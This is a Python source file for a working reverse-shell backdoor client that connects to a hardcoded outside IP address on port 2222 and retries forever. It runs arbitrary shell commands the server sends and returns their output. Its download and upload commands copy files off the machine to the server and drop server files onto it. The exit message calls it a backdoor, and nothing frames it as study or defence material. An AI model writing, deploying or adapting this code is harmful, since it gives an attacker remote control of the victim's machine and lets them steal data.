import socket
import subprocess
import time
import json
import os
import pyautogui
import signal
import sys
import hashlib

HOST_IP = '34.227.29.45'
PORT = 2222
CHUNK_SIZE = 8192

def calculate_md5(filename):
    """Calculate MD5 hash of file"""
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def receive_command(sock):
    data = ''
    while True:
        try:
            data += sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def send_output(sock, data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def send_file(sock, filename):
    """Send file to server with chunked transfer and verification"""
    try:
        if not os.path.exists(filename):
            send_output(sock, f"[!] File {filename} not found")
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        # Send file metadata
        metadata = {
            'filename': os.path.basename(filename),
            'filesize': filesize,
            'md5': md5_hash
        }
        send_output(sock, metadata)

        # Wait for ready signal
        if receive_command(sock) != "READY":
            return False

        # Send file in chunks
        bytes_sent = 0
        with open(filename, 'rb') as f:
            while bytes_sent < filesize:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                sock.sendall(chunk)
                bytes_sent += len(chunk)
                
                # Report progress
                progress = bytes_sent / filesize * 100
                send_output(sock, {"progress": progress})

        # Get transfer confirmation
        result = receive_command(sock)
        return result.get('success', False)

    except Exception as e:
        send_output(sock, f"[!] Error sending file: {str(e)}")
        return False

def receive_file(sock, target_filename):
    """Receive file from server with chunked transfer and verification"""
    try:
        # Get file metadata
        metadata = receive_command(sock)
        if isinstance(metadata, str) and metadata.startswith('[!]'):
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        # Signal ready to receive
        send_output(sock, "READY")

        # Receive file in chunks
        md5_hash = hashlib.md5()
        bytes_received = 0
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                chunk = sock.recv(min(CHUNK_SIZE, filesize - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)

        # Verify transfer
        received_md5 = md5_hash.hexdigest()
        success = received_md5 == expected_md5
        
        send_output(sock, {
            'success': success,
            'message': f"[+] File received successfully: {target_filename}" if success else "[!] File verification failed"
        })
        
        return success

    except Exception as e:
        send_output(sock, f"[!] Error receiving file: {str(e)}")
        return False

# ... rest of the code remains the same ...

def handle_cd(sock, path):
    try:
        path = path.strip().strip('"').strip("'")
        os.chdir(path)
        send_output(sock, f"[+] Changed to {os.getcwd()}")
    except FileNotFoundError:
        send_output(sock, f"[!] Directory not found: {path}")
    except PermissionError:
        send_output(sock, f"[!] Permission denied: {path}")
    except Exception as e:
        send_output(sock, f"[!] Error changing directory: {str(e)}")

def shell(sock):
    print("[+] Connection established with server")
    while True:
        try:
            command = receive_command(sock)
            
            if command == ":kill":
                print("[*] Received kill command, closing current session...")
                return False
                
            elif command.startswith("cd "):
                handle_cd(sock, command[3:])
                
           
                
            elif command.startswith("download "):
                filename = command.split(" ")[1].strip()
                send_file(sock, filename)
                
            elif command.startswith("upload "):
                filename = command.split(" ")[1].strip()
                receive_file(sock, filename)
                
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                send_output(sock, result.stdout + result.stderr)

        except (socket.error, json.JSONDecodeError) as e:
            print(f"[!] Lost connection to server: {str(e)}")
            return False

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            print("\n[*] Attempting to connect to server at {}:{}...".format(HOST_IP, PORT))
            sock.connect((HOST_IP, PORT))
            
            shell(sock)
            
        except socket.error as e:
            print(f"[!] Connection failed: {str(e)}")
            print("[*] Retrying in 10 seconds...")
        finally:
            try:
                sock.close()
            except:
                pass
            time.sleep(10)

def signal_handler(sig, frame):
    print("\n[!] Backdoor exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

while True:
    try:
        connect()
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        print("[*] Restarting connection process in 10 seconds...")
        time.sleep(10)